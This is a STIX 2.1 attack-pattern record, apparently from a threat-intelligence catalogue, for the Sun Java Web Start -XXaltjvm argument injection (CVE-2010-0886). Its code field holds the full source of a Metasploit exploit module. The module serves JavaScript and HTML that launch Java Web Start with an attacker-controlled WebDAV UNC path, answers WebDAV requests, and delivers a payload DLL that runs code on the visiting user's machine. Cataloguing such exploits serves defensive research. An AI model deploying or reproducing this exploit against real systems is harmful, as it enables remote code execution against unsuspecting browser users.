{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24cce801-7357-49fe-9693-112b5bfcb401",
    "created": "2024-08-14T16:40:39.920277Z",
    "modified": "2024-08-14T16:40:39.920281Z",
    "name": "Sun Java Web Start Plugin Command Line Argument Injection",
    "description": " This module exploits a flaw in the Web Start plugin component of Sun Java Web Start. The arguments passed to Java Web Start are not properly validated. By passing the lesser known -J option, an attacker can pass arbitrary options directly to the Java runtime. By utilizing the -XXaltjvm option, as discussed by Ruben Santamarta, an attacker can execute arbitrary code in the context of an unsuspecting browser user.  This vulnerability was originally discovered independently by both Ruben Santamarta and Tavis Ormandy. Tavis reported that all versions since version 6 Update 10 \"are believed to be affected by this vulnerability.\"  In order for this module to work, it must be ran as root on a server that does not serve SMB. Additionally, the target host must have the WebClient service (WebDAV Mini-Redirector) enabled.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/java_ws_arginject_altjvm.rb",
            "external_id": "java_ws_arginject_altjvm.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0886"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-1423"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/fulldisclosure/2010-04/0122.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.reversemode.com/index.php?option=com_content&task=view&id=67&Itemid=1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  #\n  # This module acts as an HTTP server\n  #\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sun Java Web Start Plugin Command Line Argument Injection',\n      'Description'    => %q{\n          This module exploits a flaw in the Web Start plugin component of Sun Java\n        Web Start. The arguments passed to Java Web Start are not properly validated.\n        By passing the lesser known -J option, an attacker can pass arbitrary options\n        directly to the Java runtime. By utilizing the -XXaltjvm option, as discussed\n        by Ruben Santamarta, an attacker can execute arbitrary code in the context of\n        an unsuspecting browser user.\n\n        This vulnerability was originally discovered independently by both Ruben\n        Santamarta and Tavis Ormandy. Tavis reported that all versions since version\n        6 Update 10 \"are believed to be affected by this vulnerability.\"\n\n        In order for this module to work, it must be ran as root on a server that\n        does not serve SMB. Additionally, the target host must have the WebClient\n        service (WebDAV Mini-Redirector) enabled.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'jduck',\n      'References'     =>\n        [\n          [ 'CVE', '2010-0886' ],\n          [ 'CVE', '2010-1423' ],\n          [ 'OSVDB', '63648' ],\n          [ 'BID', '39346' ],\n          [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2010-04/0122.html' ],\n          [ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=67&Itemid=1' ]\n        ],\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\"\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Java Runtime on Windows x86',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-04-09'\n      ))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The daemon port to listen on\", 80 ]),\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ]),\n        OptString.new('UNCPATH', [ false, 'Override the UNC path to use.' ])\n      ])\n  end\n\n\n  def auto_target(cli, request)\n    agent = request.headers['User-Agent']\n\n    ret = nil\n    #print_status(\"Agent: #{agent}\")\n    # Check for MSIE and/or WebDAV redirector requests\n    if agent =~ /(Windows NT (5|6)\\.(0|1|2)|MiniRedir\\/(5|6)\\.(0|1|2))/\n      ret = targets[1]\n    elsif agent =~ /MSIE (6|7|8)\\.0/\n      ret = targets[1]\n    else\n      print_status(\"Unknown User-Agent #{agent}\")\n    end\n\n    ret\n  end\n\n\n  def on_request_uri(cli, request)\n\n    # For this exploit, this does little besides ensures the user agent is a recognized one..\n    mytarget = target\n    if target.name == 'Automatic'\n      mytarget = auto_target(cli, request)\n      if (not mytarget)\n        send_not_found(cli)\n        return\n      end\n    end\n\n    # Special case to process OPTIONS for /\n    if (request.method == 'OPTIONS' and request.uri == '/')\n      process_options(cli, request, mytarget)\n      return\n    end\n\n    # Discard requests for ico files\n    if (request.uri =~ /\\.ico$/i)\n      send_not_found(cli)\n      return\n    end\n\n    # If there is no subdirectory in the request, we need to redirect.\n    if (request.uri == '/') or not (request.uri =~ /\\/([^\\/]+)\\//)\n      if (request.uri == '/')\n        subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'\n      else\n        subdir = request.uri + '/'\n      end\n      print_status(\"Request for \\\"#{request.uri}\\\" does not contain a sub-directory, redirecting to #{subdir} ...\")\n      send_redirect(cli, subdir)\n      return\n    else\n      share_name = $1\n    end\n\n    # dispatch WebDAV requests based on method first\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request, mytarget)\n\n    when 'PROPFIND'\n      process_propfind(cli, request, mytarget)\n\n    when 'GET'\n      process_get(cli, request, mytarget, share_name)\n\n    when 'PUT'\n      print_status(\"Sending 404 for PUT #{request.uri} ...\")\n      send_not_found(cli)\n\n    else\n      print_error(\"Unexpected request method encountered: #{request.method}\")\n\n    end\n\n  end\n\n  #\n  # GET requests\n  #\n  def process_get(cli, request, target, share_name)\n\n    print_status(\"Responding to \\\"GET #{request.uri}\\\" request\")\n    # dispatch based on extension\n    if (request.uri =~ /\\.dll$/i)\n      #\n      # DLL requests sent by IE and the WebDav Mini-Redirector\n      #\n      print_status(\"Sending DLL\")\n\n      # Re-generate the payload\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      # Generate a DLL based on the payload\n      dll_data = generate_payload_dll({ :code => p.encoded })\n\n      # Send it :)\n      send_response(cli, dll_data, { 'Content-Type' => 'application/octet-stream' })\n\n    else\n      #\n      # HTML requests sent by IE and Firefox\n      #\n      # This could probably use the Host header from the request\n      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n\n      # Always prepare the UNC path, even if we dont use it for this request...\n      if (datastore['UNCPATH'])\n        unc = datastore['UNCPATH'].dup\n      else\n        unc = \"\\\\\\\\\" + my_host + \"\\\\\" + share_name\n      end\n      jnlp = \"-J-XXaltjvm=\" + unc + \" -Xnosplash \" + rand_text_alphanumeric(8+rand(8)) + \".jnlp\"\n      docbase = rand_text_alphanumeric(8+rand(8))\n\n      # Provide the corresponding HTML page...\n      if (request.uri =~ /\\.shtml/i)\n        print_status(\"Sending JS version HTML\")\n        # Javascript version...\n        var_str = rand_text_alpha(8+rand(8))\n        var_obj = rand_text_alpha(8+rand(8))\n        var_obj2 = rand_text_alpha(8+rand(8))\n        var_obj3 = rand_text_alpha(8+rand(8))\n        js_jnlp = \"http: \"\n        js_jnlp << jnlp.dup.gsub(\"\\\\\", \"\\\\\\\\\\\\\\\\\") # jeez\n\n        # The 8ad.. CLSID doesn't support the launch method ...\n        #clsid = '8AD9C840-044E-11D1-B3E9-00805F499D93'\n        clsid = 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA'\n        html = %Q|<html>\n<body>Please wait...\n<script language=\"javascript\">\nvar #{var_str} = \"#{js_jnlp}\";\nif (window.navigator.appName == \"Microsoft Internet Explorer\") {\nvar #{var_obj} = document.createElement(\"OBJECT\");\n#{var_obj}.classid = \"clsid:#{clsid}\";\n#{var_obj}.launch(#{var_str});\n} else {\ntry {\nvar #{var_obj2} = document.createElement(\"OBJECT\");\n#{var_obj2}.type = \"application/npruntime-scriptable-plugin;deploymenttoolkit\";\ndocument.body.appendChild(#{var_obj2});\n#{var_obj2}.launch(#{var_str});\n} catch (e) {\nvar #{var_obj3} = document.createElement(\"OBJECT\");\n#{var_obj3}.type = \"application/java-deployment-toolkit\";\ndocument.body.appendChild(#{var_obj3});\n#{var_obj3}.launch(#{var_str});\n}\n}\n</script>\n</body>\n</html>\n|\n      elsif (request.uri =~ /\\.htm/i)\n        print_status(\"Sending non-JS version HTML\")\n        clsids = [ '8AD9C840-044E-11D1-B3E9-00805F499D93', 'CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA' ]\n        clsid = clsids[rand(clsids.length)]\n        html = %Q|<html>\n<body>Please wait...\n<object id=\"#{var_obj}\" classid=\"clsid:#{clsid}\"\nwidth=\"0\" height=\"0\">\n<PARAM name=\"launchjnlp\" value=\"#{jnlp}\">\n<PARAM name=\"docbase\" value=\"#{docbase}\">\n</object>\n<embed type=\"application/x-java-applet\"\nwidth=\"0\" height=\"0\"\nlaunchjnlp=\"#{jnlp}\"\ndocbase=\"#{docbase}\"\n/>\n</body>\n</html>\n|\n      else\n        print_status(\"Sending js detection HTML\")\n\n        # NOTE: The JS version is preferred to the HTML version since it works on more JRE versions\n        js_uri = rand_text_alphanumeric(8+rand(8)) + \".shtml\"\n        no_js_uri = rand_text_alphanumeric(8+rand(8)) + \".htm\"\n\n        html = %Q|<html>\n<head>\n<meta http-equiv=\"refresh\" content=\"2;#{no_js_uri}\" />\n</head>\n<body>\nPlease wait...\n<script language=\"javascript\">\ndocument.location = \"#{js_uri}\";\n</script>\n</body>\n</html>\n|\n        # end of detection html\n      end\n\n      send_response_html(cli, html,\n        {\n          'Content-Type' => 'text/html',\n          'Pragma' => 'no-cache'\n        })\n    end\n\n  end\n\n  #\n  # OPTIONS requests sent by the WebDav Mini-Redirector\n  #\n  def process_options(cli, request, target)\n    print_status(\"Responding to WebDAV \\\"OPTIONS #{request.uri}\\\" request\")\n    headers = {\n      #'DASL'   => '<DAV:sql>',\n      #'DAV'    => '1, 2',\n      'Allow'  => 'OPTIONS, GET, PROPFIND',\n      'Public' => 'OPTIONS, GET, PROPFIND'\n    }\n    send_response(cli, '', headers)\n  end\n\n\n  #\n  # PROPFIND requests sent by the WebDav Mini-Redirector\n  #\n  def process_propfind(cli, request, target)\n    path = request.uri\n    print_status(\"Received WebDAV \\\"PROPFIND #{request.uri}\\\" request\")\n    body = ''\n\n    if (path =~ /\\.dll$/i)\n      # Response for the DLL\n      print_status(\"Sending DLL multistatus for #{path} ...\")\n#<lp1:getcontentlength>45056</lp1:getcontentlength>\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype/>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0132-b000-43c6e5f8d2f80\"</lp1:getetag>\n<lp2:executable>F</lp2:executable>\n<D:lockdiscovery/>\n<D:getcontenttype>application/octet-stream</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n    elsif (path =~ /\\/$/) or (not path.sub('/', '').index('/'))\n      # Response for anything else (generally just /)\n      print_status(\"Sending directory multistatus for #{path} ...\")\n      body = %Q|<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<D:multistatus xmlns:D=\"DAV:\">\n<D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n<D:href>#{path}</D:href>\n<D:propstat>\n<D:prop>\n<lp1:resourcetype><D:collection/></lp1:resourcetype>\n<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>\n<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>\n<lp1:getetag>\"39e0001-1000-4808c3ec95000\"</lp1:getetag>\n<D:lockdiscovery/>\n<D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n</D:prop>\n<D:status>HTTP/1.1 200 OK</D:status>\n</D:propstat>\n</D:response>\n</D:multistatus>\n|\n\n    else\n      print_status(\"Sending 404 for #{path} ...\")\n      send_not_found(cli)\n      return\n\n    end\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n\n  #\n  # Make sure we're on the right port/path to support WebDAV\n  #\n  def exploit\n    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'\n      fail_with(Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')\n    end\n\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-09",
    "x_mitre_platforms": [
        "win'"
    ]
}